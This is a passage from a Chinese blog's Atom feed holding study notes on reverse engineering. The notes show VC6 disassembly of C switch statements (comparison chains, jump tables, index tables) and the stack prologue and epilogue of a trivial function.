      &lt;h2 id=&quot;内存模式&quot;&gt;&lt;a href=&quot;#内存模式&quot; class=&quot;headerlink&quot; title=&quot;内存模式&quot;&gt;&lt;/a&gt;内存模式&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;.386&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.model flat,stdcall ;子程序调用模式，win32中只能用stdcall，因为win32api调用使用的这个&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;option casemap:none ;定义了程序中变量和子程序名是否对大小写敏感，win32api名称区分大小写，所以只需要记住这个定式&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://akkuman.coding.me/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="读书笔记" scheme="http://akkuman.coding.me/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="二进制" scheme="http://akkuman.coding.me/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>switch反汇编(C语言)</title>
    <link href="http://akkuman.coding.me/2017/09/07/switch%E5%8F%8D%E6%B1%87%E7%BC%96-C%E8%AF%AD%E8%A8%80.html"/>
    <id>http://akkuman.coding.me/2017/09/07/switch反汇编-C语言.html</id>
    <published>2017-09-06T16:25:09.000Z</published>
    <updated>2017-09-06T16:27:53.706Z</updated>
    
    <content type="html"><![CDATA[<p>在分支较多的时候，switch的效率比if高，在反汇编中我们即可看到效率高的原因<br><a id="more"></a></p>
<h2 id="0x01分支结构不超过3个"><a href="#0x01分支结构不超过3个" class="headerlink" title="0x01分支结构不超过3个"></a>0x01分支结构不超过3个</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> x = <span class="number">5</span>;</div><div class="line">	<span class="keyword">switch</span>(x)</div><div class="line">	&#123;</div><div class="line">	<span class="keyword">case</span> <span class="number">5</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">7</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">5:        int x = 5;</div><div class="line">00401028   mov         dword ptr [ebp-4],5</div><div class="line">6:        switch(x)</div><div class="line">7:        &#123;</div><div class="line">0040102F   mov         eax,dword ptr [ebp-4]</div><div class="line">00401032   mov         dword ptr [ebp-8],eax         //x的值放入[ebp-8]</div><div class="line">00401035   cmp         dword ptr [ebp-8],5</div><div class="line">00401039   je          main+39h (00401049)           //x与5相等就跳转，下面6和7相同</div><div class="line">0040103B   cmp         dword ptr [ebp-8],6</div><div class="line">0040103F   je          main+4Ch (0040105c)</div><div class="line">00401041   cmp         dword ptr [ebp-8],7</div><div class="line">00401045   je          main+5Fh (0040106f)</div><div class="line">00401047   jmp         main+72h (00401082)</div><div class="line">8:        case 5:</div><div class="line">9:            printf(&quot;%d\n&quot;,x);</div><div class="line">00401049   mov         ecx,dword ptr [ebp-4]</div><div class="line">0040104C   push        ecx</div><div class="line">0040104D   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401052   call        printf (004010d0)</div><div class="line">00401057   add         esp,8</div><div class="line">10:           break;</div><div class="line">0040105A   jmp         main+83h (00401093)</div><div class="line">11:       case 6:</div><div class="line">12:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040105C   mov         edx,dword ptr [ebp-4]</div><div class="line">0040105F   push        edx</div><div class="line">00401060   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401065   call        printf (004010d0)</div><div class="line">0040106A   add         esp,8</div><div class="line">13:           break;</div><div class="line">0040106D   jmp         main+83h (00401093)</div><div class="line">14:       case 7:</div><div class="line">15:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040106F   mov         eax,dword ptr [ebp-4]</div><div class="line">00401072   push        eax</div><div class="line">00401073   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401078   call        printf (004010d0)</div><div class="line">0040107D   add         esp,8</div><div class="line">16:           break;</div><div class="line">00401080   jmp         main+83h (00401093)</div><div class="line">17:       default:</div><div class="line">18:           printf(&quot;%d\n&quot;,x);</div><div class="line">00401082   mov         ecx,dword ptr [ebp-4]</div><div class="line">00401085   push        ecx</div><div class="line">00401086   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040108B   call        printf (004010d0)</div><div class="line">00401090   add         esp,8</div><div class="line">19:           break;</div><div class="line">20:       &#125;</div></pre></td></tr></table></figure>
<h2 id="0x02分支数超过3且分支存在线性关系"><a href="#0x02分支数超过3且分支存在线性关系" class="headerlink" title="0x02分支数超过3且分支存在线性关系"></a>0x02分支数超过3且分支存在线性关系</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> x = <span class="number">5</span>;</div><div class="line">	<span class="keyword">switch</span>(x)</div><div class="line">	&#123;</div><div class="line">	<span class="keyword">case</span> <span class="number">5</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">7</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">8</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">9</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line">5:        int x = 5;</div><div class="line">0040D778   mov         dword ptr [ebp-4],5</div><div class="line">6:        switch(x)</div><div class="line">7:        &#123;</div><div class="line">0040D77F   mov         eax,dword ptr [ebp-4]</div><div class="line">0040D782   mov         dword ptr [ebp-8],eax</div><div class="line">0040D785   mov         ecx,dword ptr [ebp-8]</div><div class="line">0040D788   sub         ecx,5                              //x减去分支中的最小值5，方便构建跳转表</div><div class="line">0040D78B   mov         dword ptr [ebp-8],ecx</div><div class="line">0040D78E   cmp         dword ptr [ebp-8],4                </div><div class="line">0040D792   ja          $L537+13h (0040d7fd)               //x-5&gt;4跳转到default，即x&gt;9跳转</div><div class="line">0040D794   mov         edx,dword ptr [ebp-8]              //edx=x-5</div><div class="line">0040D797   jmp         dword ptr [edx*4+40D81Fh]          //构建跳转表，根据edx的值从对应地址取出值(各个分支的地址)，40D81F为跳转表起始地址</div><div class="line">8:        case 5:</div><div class="line">9:            printf(&quot;%d\n&quot;,x);</div><div class="line">0040D79E   mov         eax,dword ptr [ebp-4]</div><div class="line">0040D7A1   push        eax</div><div class="line">0040D7A2   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7A7   call        printf (004010d0)</div><div class="line">0040D7AC   add         esp,8</div><div class="line">10:           break;</div><div class="line">0040D7AF   jmp         $L537+24h (0040d80e)</div><div class="line">11:       case 6:</div><div class="line">12:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7B1   mov         ecx,dword ptr [ebp-4]</div><div class="line">0040D7B4   push        ecx</div><div class="line">0040D7B5   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7BA   call        printf (004010d0)</div><div class="line">0040D7BF   add         esp,8</div><div class="line">13:           break;</div><div class="line">0040D7C2   jmp         $L537+24h (0040d80e)</div><div class="line">14:       case 7:</div><div class="line">15:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7C4   mov         edx,dword ptr [ebp-4]</div><div class="line">0040D7C7   push        edx</div><div class="line">0040D7C8   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7CD   call        printf (004010d0)</div><div class="line">0040D7D2   add         esp,8</div><div class="line">16:           break;</div><div class="line">0040D7D5   jmp         $L537+24h (0040d80e)</div><div class="line">17:       case 8:</div><div class="line">18:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7D7   mov         eax,dword ptr [ebp-4]</div><div class="line">0040D7DA   push        eax</div><div class="line">0040D7DB   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7E0   call        printf (004010d0)</div><div class="line">0040D7E5   add         esp,8</div><div class="line">19:           break;</div><div class="line">0040D7E8   jmp         $L537+24h (0040d80e)</div><div class="line">20:       case 9:</div><div class="line">21:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7EA   mov         ecx,dword ptr [ebp-4]</div><div class="line">0040D7ED   push        ecx</div><div class="line">0040D7EE   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7F3   call        printf (004010d0)</div><div class="line">0040D7F8   add         esp,8</div><div class="line">22:           break;</div><div class="line">0040D7FB   jmp         $L537+24h (0040d80e)</div><div class="line">23:       default:</div><div class="line">24:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7FD   mov         edx,dword ptr [ebp-4]</div><div class="line">0040D800   push        edx</div><div class="line">0040D801   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D806   call        printf (004010d0)</div><div class="line">0040D80B   add         esp,8</div><div class="line">25:           break;</div><div class="line">26:       &#125;</div></pre></td></tr></table></figure>
<p>跳转表从[edx*4+40D81Fh]取出分支的地址值然后进行jmp，下表是跳转表部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0040D81F  9E D7 40 00  ..@.</div><div class="line">0040D823  B1 D7 40 00  ..@.</div><div class="line">0040D827  C4 D7 40 00  ..@.</div><div class="line">0040D82B  D7 D7 40 00  ..@.</div><div class="line">0040D82F  EA D7 40 00  ..@.</div></pre></td></tr></table></figure></p>
<h2 id="0x03分支跃度大难以构成跳转表的分支结构"><a href="#0x03分支跃度大难以构成跳转表的分支结构" class="headerlink" title="0x03分支跃度大难以构成跳转表的分支结构"></a>0x03分支跃度大难以构成跳转表的分支结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> x = <span class="number">5</span>;</div><div class="line">	<span class="keyword">switch</span>(x)</div><div class="line">	&#123;</div><div class="line">	<span class="keyword">case</span> <span class="number">5</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">7</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">8</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">100</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line">5:        int x = 5;</div><div class="line">00401028   mov         dword ptr [ebp-4],5</div><div class="line">6:        switch(x)</div><div class="line">7:        &#123;</div><div class="line">0040102F   mov         eax,dword ptr [ebp-4]</div><div class="line">00401032   mov         dword ptr [ebp-8],eax</div><div class="line">00401035   mov         ecx,dword ptr [ebp-8]</div><div class="line">00401038   sub         ecx,5</div><div class="line">0040103B   mov         dword ptr [ebp-8],ecx</div><div class="line">0040103E   cmp         dword ptr [ebp-8],5Fh</div><div class="line">00401042   ja          $L536+13h (004010b5)               //具体参见上一种,x大于100跳转到default</div><div class="line">00401044   mov         eax,dword ptr [ebp-8]              //edx=x-5</div><div class="line">00401047   xor         edx,edx                            //edx置零</div><div class="line">00401049   mov         dl,byte ptr  (004010ef)[eax]       //查询索引表并将取出来的值放入DL(在od里面的这条反汇编更清楚)</div><div class="line">0040104F   jmp         dword ptr [edx*4+4010D7h]          //根据DL(EDX)的值查跳转表</div><div class="line">8:        case 5:</div><div class="line">9:            printf(&quot;%d\n&quot;,x);</div><div class="line">00401056   mov         ecx,dword ptr [ebp-4]</div><div class="line">00401059   push        ecx</div><div class="line">0040105A   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040105F   call        printf (004011a0)</div><div class="line">00401064   add         esp,8</div><div class="line">10:           break;</div><div class="line">00401067   jmp         $L536+24h (004010c6)</div><div class="line">11:       case 6:</div><div class="line">12:           printf(&quot;%d\n&quot;,x);</div><div class="line">00401069   mov         edx,dword ptr [ebp-4]</div><div class="line">0040106C   push        edx</div><div class="line">0040106D   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401072   call        printf (004011a0)</div><div class="line">00401077   add         esp,8</div><div class="line">13:           break;</div><div class="line">0040107A   jmp         $L536+24h (004010c6)</div><div class="line">14:       case 7:</div><div class="line">15:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040107C   mov         eax,dword ptr [ebp-4]</div><div class="line">0040107F   push        eax</div><div class="line">00401080   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401085   call        printf (004011a0)</div><div class="line">0040108A   add         esp,8</div><div class="line">16:           break;</div><div class="line">0040108D   jmp         $L536+24h (004010c6)</div><div class="line">17:       case 8:</div><div class="line">18:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040108F   mov         ecx,dword ptr [ebp-4]</div><div class="line">00401092   push        ecx</div><div class="line">00401093   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401098   call        printf (004011a0)</div><div class="line">0040109D   add         esp,8</div><div class="line">19:           break;</div><div class="line">004010A0   jmp         $L536+24h (004010c6)</div><div class="line">20:       case 100:</div><div class="line">21:           printf(&quot;%d\n&quot;,x);</div><div class="line">004010A2   mov         edx,dword ptr [ebp-4]</div><div class="line">004010A5   push        edx</div><div class="line">004010A6   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">004010AB   call        printf (004011a0)</div><div class="line">004010B0   add         esp,8</div><div class="line">22:           break;</div><div class="line">004010B3   jmp         $L536+24h (004010c6)</div><div class="line">23:       default:</div><div class="line">24:           printf(&quot;%d\n&quot;,x);</div><div class="line">004010B5   mov         eax,dword ptr [ebp-4]</div><div class="line">004010B8   push        eax</div><div class="line">004010B9   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">004010BE   call        printf (004011a0)</div><div class="line">004010C3   add         esp,8</div><div class="line">25:           break;</div><div class="line">26:       &#125;</div></pre></td></tr></table></figure>
<p>索引表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">004010F1  00 01 02 03 05 05 05 05  ........</div><div class="line">004010F9  05 05 05 05 05 05 05 05  ........</div><div class="line">00401101  05 05 05 05 05 05 05 05  ........</div><div class="line">00401109  05 05 05 05 05 05 05 05  ........</div><div class="line">00401111  05 05 05 05 05 05 05 05  ........</div><div class="line">00401119  05 05 05 05 05 05 05 05  ........</div><div class="line">00401121  05 05 05 05 05 05 05 05  ........</div><div class="line">00401129  05 05 05 05 05 05 05 05  ........</div><div class="line">00401131  05 05 05 05 05 05 05 05  ........</div><div class="line">00401139  05 05 05 05 05 05 05 05  ........</div><div class="line">00401141  05 05 05 05 05 05 05 05  ........</div><div class="line">00401149  05 05 05 05 05 05 05 04  ........</div></pre></td></tr></table></figure></p>
<p>跳转表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">004010D9  58 10 40 00  X.@.</div><div class="line">004010DD  6B 10 40 00  k.@.</div><div class="line">004010E1  7E 10 40 00  ~.@.</div><div class="line">004010E5  91 10 40 00  ..@.</div><div class="line">004010E9  A4 10 40 00  ..@.</div><div class="line">004010ED  B7 10 40 00  ..@.</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在分支较多的时候，switch的效率比if高，在反汇编中我们即可看到效率高的原因&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://akkuman.coding.me/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://akkuman.coding.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>最最简单的c语言函数汇编分析</title>
    <link href="http://akkuman.coding.me/2017/09/06/%E6%9C%80%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84c%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90.html"/>
    <id>http://akkuman.coding.me/2017/09/06/最最简单的c语言函数汇编分析.html</id>
    <published>2017-09-06T06:18:26.000Z</published>
    <updated>2017-09-06T06:20:24.288Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><p>xp+vc6.0</p>
<h2 id="0x02-代码"><a href="#0x02-代码" class="headerlink" title="0x02 代码"></a>0x02 代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">plus</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>以下是vc6.0的反汇编窗口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">1:    int plus(int x, int y)</div><div class="line">2:    &#123;</div><div class="line">00401020   push        ebp</div><div class="line">00401021   mov         ebp,esp</div><div class="line">00401023   sub         esp,40h</div><div class="line">00401026   push        ebx</div><div class="line">00401027   push        esi</div><div class="line">00401028   push        edi</div><div class="line">00401029   lea         edi,[ebp-40h]</div><div class="line">0040102C   mov         ecx,10h</div><div class="line">00401031   mov         eax,0CCCCCCCCh</div><div class="line">00401036   rep stos    dword ptr [edi]</div><div class="line">3:        return 0;</div><div class="line">00401038   xor         eax,eax</div><div class="line">4:    &#125;</div><div class="line">0040103A   pop         edi</div><div class="line">0040103B   pop         esi</div><div class="line">0040103C   pop         ebx</div><div class="line">0040103D   mov         esp,ebp</div><div class="line">0040103F   pop         ebp</div><div class="line">00401040   ret</div></pre></td></tr></table></figure></p>
<h2 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">push      ebp</div><div class="line">mov       ebp,esp</div><div class="line">sub       esp,40h</div><div class="line">//提升栈，为函数腾出空间，为ebp寻址做准备</div><div class="line">push      ebx</div><div class="line">push      esi</div><div class="line">push      edi</div><div class="line">//寄存器压栈，保存现场</div><div class="line">lea       edi,[ebp-40h]</div><div class="line">//将ebp-40h（esp）的具体内存地址存到edi</div><div class="line">mov       ecx,10h</div><div class="line">//10（十六进制）存入计数寄存器</div><div class="line">mov       eax,0xCCCCCCCC</div><div class="line">//初始化eax</div><div class="line">rep stos  dword ptr [edi]</div><div class="line">//用eax中的值初始化到es:[edi]指向的地址，长度为dword，循环执行次数为eax中的值（恰好ebp-&gt;esp全部被初始化）</div><div class="line">xor       eax,eax</div><div class="line">//eax清零</div><div class="line">pop       edi</div><div class="line">pop       esi</div><div class="line">pop       ebx</div><div class="line">mov       esp,ebp</div><div class="line">pop       ebp</div><div class="line">ret</div><div class="line">//寄存器出栈，恢复现场，堆栈平衡并返回</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-环境&quot;&gt;&lt;a href=&quot;#0x01-环境&quot; class=&quot;headerlink&quot; title=&quot;0x01 环境&quot;&gt;&lt;/a&gt;0x01 环境&lt;/h2&gt;&lt;p&gt;xp+vc6.0&lt;/p&gt;
